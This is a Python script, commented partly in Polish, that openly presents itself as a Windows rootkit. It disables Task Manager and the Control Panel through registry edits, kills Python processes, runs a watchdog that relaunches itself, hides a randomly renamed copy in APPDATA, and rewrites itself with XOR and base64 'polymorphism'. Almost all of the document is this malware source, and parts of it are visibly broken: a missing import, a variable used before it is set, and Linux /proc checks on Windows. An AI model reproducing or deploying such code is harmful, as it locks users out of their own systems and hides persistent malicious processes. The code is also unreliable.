import os
import sys
import time
import threading
import winreg
import random
import string
import base64

LOCK_FILE = os.path.join(os.getenv('APPDATA'), '.rootkit', 'rootkit.lock')

def usun_blokade():
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
    except Exception:
        pass

# Sprawdź czy już działa inna instancja
if os.path.exists(LOCK_FILE):
    try:
        with open(LOCK_FILE, 'r') as f:
            pid = int(f.read())
            if os.path.exists(f"/proc/{pid}"):  # Dla Linuxa
                sys.exit(0)
    except:
        pass
    usun_blokade()

try:
    with open(LOCK_FILE, 'w') as f:
        f.write(str(os.getpid()))
except Exception:
    sys.exit(0)

atexit.register(usun_blokade)

def modify_registry():
    # Open the registry key
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_SET_VALUE)
    # Modify the registry value
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    # Close the registry key
    winreg.CloseKey(key)

    # Open the registry key
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, winreg.KEY_SET_VALUE)
    # Modify the registry value
    winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
    # Close the registry key
    winreg.CloseKey(key)

def hide_process():
    # Hide the current process
    os.system("taskkill /f /im python.exe")

def monitor_process():
    while True:
        try:
            # Sprawdź czy główny proces żyje
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read())
                if not os.path.exists(f"/proc/{pid}"):  # Dla Linuxa
                    os.system(f"start python {os.path.join(os.getenv('APPDATA'), '.rootkit', new_name)}")
        except Exception:
            os.system(f"start python {os.path.join(os.getenv('APPDATA'), '.rootkit', new_name)}")
        
        time.sleep(15)  # Zwiększony czas sprawdzania

def polymorphism(code):
    # Perform polymorphism on the code
    encoded_code = base64.b64encode(code.encode()).decode()
    return encoded_code

def encrypt(code):
    # Encrypt the code
    encrypted_code = ''.join(chr(ord(c) ^ 0x50) for c in code)
    return encrypted_code

# Generate a random name for the script
def generate_random_name():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(10)) + '.py'

# Start the monitoring thread
monitor_thread = threading.Thread(target=monitor_process)
monitor_thread.start()

# Modify the registry
modify_registry()

# Hide the current process
hide_process()

# Rename and move the script to a hidden directory
new_name = generate_random_name()
os.rename(sys.argv[0], new_name)
os.system("mkdir -p %APPDATA%\\.rootkit && move {} %APPDATA%\\.rootkit\\".format(new_name))

# Encrypt and polymorph the code
with open(os.path.join(os.getenv('APPDATA'), '.rootkit', new_name), 'r') as f:
    code = f.read()
    encrypted_code = encrypt(code)
    polymorphic_code = polymorphism(encrypted_code)

with open(os.path.join(os.getenv('APPDATA'), '.rootkit', new_name), 'w') as f:
    f.write(polymorphic_code)

# Keep the rootkit running in the background
while True:
    time.sleep(1)